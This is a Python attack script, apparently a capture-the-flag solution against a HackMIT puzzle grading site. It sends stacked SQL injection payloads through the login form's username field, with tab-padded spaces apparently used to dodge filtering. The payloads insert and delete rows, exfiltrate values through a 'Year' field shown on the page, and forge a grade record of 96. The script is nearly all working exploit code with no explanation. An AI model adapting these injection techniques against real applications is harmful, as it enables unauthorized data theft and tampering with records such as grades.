# -*- coding: utf-8 -*-
import string
import random

import requests

username = 'Vivswan_5c6aa1'
url = f'https://gradebase.hackmit.academy/u/{username}'
grades_columns = ['id', 'user_id', 'classname', 'grade', 'code', 'credits']
# ['13', '5', 'Cryptography and Cryptanalysis', '40', '6.875', '12']
temp_username = 'sjfeowiejwi'
user_id = None

requests.post(f"{url}/login", data={
    'username': f"{username}'; INSERT INTO \"user\" values (102480, '{temp_username}', (SELECT id FROM \"user\" where username = '{username}')) --".replace(" ", " \t "),
    'password': "%"
})

x = requests.post(f"{url}/login", data={'username': 'sjfeowiejwi'})
for i in x.text.split("\n"):
    if i.__contains__("Year"):
        user_id = i.replace("Year:", "").replace("<h5>", "").replace("</h5>", "").strip()
        print(f"user_id: {user_id}")
        break

requests.post(f"{url}/login", data={
    'username': f"{username}'; DELETE FROM \"user\" where username='{temp_username}' --".replace(" ", " \t "),
    'password': "%"
})


grade_id = '102480'
print(requests.post(f"{url}/login", data={
    'username': f"{username}'; INSERT INTO \"grade\" values ({grade_id}, {user_id}, '&&&&', '96', '2020', '1') --".replace(" ", " \t ").replace('&&&&', 'Why? :)'),
    'password': "%"
}).text)

grades = []

# while True:
#     column_name = 'id'
#     data = {
#         'username': f"{username}'; INSERT INTO \"user\" values (102480, '{temp_username}', (SELECT {column_name} FROM \"grade\" where user_id IS NOT NULL",
#         'password': "%"
#     }
#     for i in grades:
#         data['username'] += f" and not {column_name}='{i}' "
#     data['username'] += " LIMIT 1))  --"
#     data['username'] = data['username'].replace(" ", " \t ")
#
#     requests.post(f"{url}/login", data=data)
#     # print(x.text)
#
#     x = requests.post(f"{url}/login", data={'username': temp_username})
#     for i in x.text.split("\n"):
#         if i.__contains__("Year"):
#             grades.append(i.replace("Year:", "").replace("<h5>", "").replace("</h5>", "").strip())
#             print(grades)
#
#     requests.post(f"{url}/login", data={
#         'username': f"{username}'; DELETE FROM \"user\" where username='{temp_username}' --".replace(" ", " \t "),
#         'password': "%"
#     })
#
#     if grades[-1] == 'None':
#         break


for i in grades_columns:
    data = {
        'username': f"{username}'; INSERT INTO \"user\" values (102480, '{temp_username}', (SELECT {i} FROM \"grade\" where id={grade_id} LIMIT 1 )) -- ".replace(" ", " \t "),
        'password': "%"
    }

    requests.post(f"{url}/login", data=data)
    # print(x.text)

    x = requests.post(f"{url}/login", data={'username': temp_username})
    for i in x.text.split("\n"):
        if i.__contains__("Year"):
            grades.append(i.replace("Year:", "").replace("<h5>", "").replace("</h5>", "").strip())
            print(grades)
            break

    requests.post(f"{url}/login", data={
        'username': f"{username}'; DELETE FROM \"user\" where username='{temp_username}' --".replace(" ", " \t "),
        'password': "%"
    })


# requests.post(f"{url}/login", data={
#     'username': f"{username}'; DELETE FROM \"grade\" where id={grade_id} --".replace(" ", " \t "),
#     'password': "%"
# })
